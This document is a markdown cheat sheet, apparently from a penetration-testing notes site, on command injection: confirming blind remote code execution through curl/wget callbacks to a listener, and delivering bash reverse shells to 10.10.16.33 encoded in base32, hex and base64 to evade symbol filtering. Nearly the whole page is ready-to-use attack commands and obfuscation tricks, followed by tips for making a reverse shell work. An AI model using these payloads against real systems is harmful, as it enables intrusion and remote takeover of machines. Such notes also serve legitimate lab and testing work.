---
sort: 2
---

# Payload Injection 

## Detecting RCE

start listening 
```bash 
$ nc -lnvp 1234 
# OR
$ python3 -m http.server 1234
```

submit one of the payloads
```bash
# start with the least complex 
$ curl http://IP:1234/`id`
$ wget http://IP:1234/$(id)

$ curl http://IP:1234/`which base64` # base32 base58 xxd python sed printf .... 
```

what should be received
```bash 
$ nc -lnvp 1234 

# GET //usr/bin/base64 HTTP/1.1
# User-Agent: Wget/1.17.1 (linux-gnu)
# Accept: */*
# Accept-Encoding: identity
# Host: IP:1234
# Connection: Keep-Alive
```
## payloads encoding 

don't wrap the encoded payload with a qoutation ... it's better ^^ 

```bash
$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.33/1234     0>&1'" | base32 -w 0
# MJQXG2BAFVRSAJ3CMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE3C4MZTF4YTEMZUEAQCAIBAGA7CMMJH

# remember to use a different port in the inner payload
$ curl http://10.10.16.33:4444/`echo MJQXG2BAFVRSAJ3CMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE3C4MZTF4YTEMZUEAQCAIBAGA7CMMJH | base32 -d | bash`
```

```bash
$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.33/1234 0>&1'" | xxd -plain     
# 62617368202d63202762617368202d69203e26202f6465762f7463702f31302e31302e31362e33332f3132333420303e263127

$ echo -n "62617368202d63202762617368202d69203e26202f6465762f7463702f31302e31302e31362e33332f3132333420303e263127" | xxd -r -p

curl http://10.10.16.33:4444/`echo -n 62617368202d63202762617368202d69203e26202f6465762f7463702f31302e31302e31362e33332f3132333420303e263127 | xxd -r -p | bash`
```


## Tricks

we don't wanna see any symbols (+, =)...just add extra spaces inside the payload when using bases encoding, or try to change the port number ^^ 

```bash 
$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.33/1234 0>&1'" | base64 -w 0 
# YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMy8xMjM0IDA+JjEn

$ $ echo -n "bash -c 'bash  -i >& /dev/tcp/10.10.16.33/1234  0>&1' " | base64 -w 0
# YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzMvMTIzNCAgMD4mMScg
```

```bash
$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.33/1234 0>&1'" | base32 -w 0
# MJQXG2BAFVRSAJ3CMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE3C4MZTF4YTEMZUEAYD4JRRE4=====    

$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.33/1234     0>&1'" | base32 -w 0
# MJQXG2BAFVRSAJ3CMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE3C4MZTF4YTEMZUEAQCAIBAGA7CMMJH
```

## Some reasons why the reverse shell is not working ?

* Consider where the payload is submitted 

	* inside a script ?
	* on the browser ? 
	* on burp suite ? 

* try to avoid using **escape characters** & **symbols** (i.e `+`, `'`, `"`, `=`)

* and if you used them, escape what should be escaped

